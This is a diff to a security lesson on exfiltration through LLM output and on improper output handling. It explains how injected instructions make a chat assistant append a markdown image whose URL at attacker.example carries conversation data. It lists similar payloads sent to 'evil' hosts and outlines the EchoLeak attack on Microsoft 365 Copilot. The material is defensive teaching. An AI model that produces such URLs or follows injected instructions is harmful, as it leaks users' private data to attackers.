@@ -1,6 +1,6 @@
 # Exfiltration and Output Handling
 
-The lethal trifecta (lesson 03) needs an external channel. The sneakiest channel is not a tool at all: it is **the answer itself**. Model output gets rendered as markdown in a chat window, inserted into HTML, written to a log, passed to a shell or a SQL query. Whatever interprets that output does what the text says. OWASP lists this as *Improper Output Handling* (LLM05 in the 2025 edition, LLM10 in 2026): treat model output like any other untrusted input to the next component.
+The lethal trifecta (lesson 03) needs an external channel. The sneakiest channel is not a tool at all: it is **the answer itself**. Model output gets rendered as markdown in a chat window, inserted into HTML, written to a log, passed to a shell or a SQL query. Whatever interprets that output does what the text says. OWASP lists this as *Improper Output Handling* (LLM05 in the 2025 edition; ids change between editions): treat model output like any other untrusted input to the next component.
 
 ## The zero-click image
 
@@ -9,7 +9,7 @@ Your invoice is due on Friday.
 ![](https://attacker.example/pixel.png?d=reset-link-for-ada)
 ```
 
-The user asked for a summary. An injected instruction told the model to append an image whose URL contains data from the conversation. The chat UI renders markdown, the browser fetches the image to display it, and the attacker's server logs the query string. Nobody clicked anything. Researchers have shown this pattern against most major chat assistants since 2023, and vendors fixed it one by one, usually by restricting which hosts images may load from.
+The user asked for a summary. An injected instruction told the model to append an image whose URL contains data from the conversation. The chat UI renders markdown, the browser fetches the image to display it, and the attacker's server logs the query string. Nobody clicked anything. Researchers have shown this pattern against most major chat assistants and vendors fixed it one by one, usually by restricting which hosts images may load from.
 
 The same idea comes in many shapes, and filters that handle one shape miss the next:
 
@@ -22,7 +22,7 @@ The same idea comes in many shapes, and filters that handle one shape miss the n
 | Autolink or bare URL | `<https://evil/?d=DATA>`, `https://evil/?d=DATA` | yes |
 | Tool call | `fetch_url({ url: "https://evil/?d=DATA" })` | no (lesson 03) |
 
-EchoLeak (CVE-2025-32711, June 2025), a zero-click attack on Microsoft 365 Copilot, chained exactly these gaps: an email whose injection slipped past a classifier, reference-style markdown that the link redaction did not catch, an image fetched automatically, and an allowlisted Microsoft domain that proxied the request onward. The lesson: an allowlist is only as strong as its weakest allowed host. A domain with an open redirect, a proxy or user-controlled content is a channel.
+EchoLeak (CVE-2025-32711), a zero-click attack on Microsoft 365 Copilot, chained exactly these gaps: an email whose injection slipped past a classifier, reference-style markdown that the link redaction did not catch, an image fetched automatically, and an allowlisted Microsoft domain that proxied the request onward. The lesson: an allowlist is only as strong as its weakest allowed host. A domain with an open redirect, a proxy or user-controlled content is a channel.
 
 ## Sanitize before rendering
 
@@ -49,7 +49,7 @@ Removing dangerous constructs is half the job; the other half is **encoding** wh
 
 Encode at the moment of insertion, once, for that context: encoding twice shows `&amp;amp;`, and encoding for the wrong context protects nothing. Frameworks such as React encode text by default; the risk returns the moment someone uses `dangerouslySetInnerHTML` or a markdown component that allows raw HTML.
 
-> **Status as of October 2026:** markdown image exfiltration has been reported and fixed in most major chat assistants since 2023, and keeps reappearing in new products, IDE agents and integrations. EchoLeak (CVE-2025-32711) was rated critical and fixed server-side by Microsoft in 2025. OWASP's LLM Top 10 lists Improper Output Handling as LLM05 (2025 edition) and LLM10 (2026 edition).
+Markdown image exfiltration keeps reappearing in new products, IDE agents and integrations, so test every renderer that shows model output.
 
 ## When to choose it
 
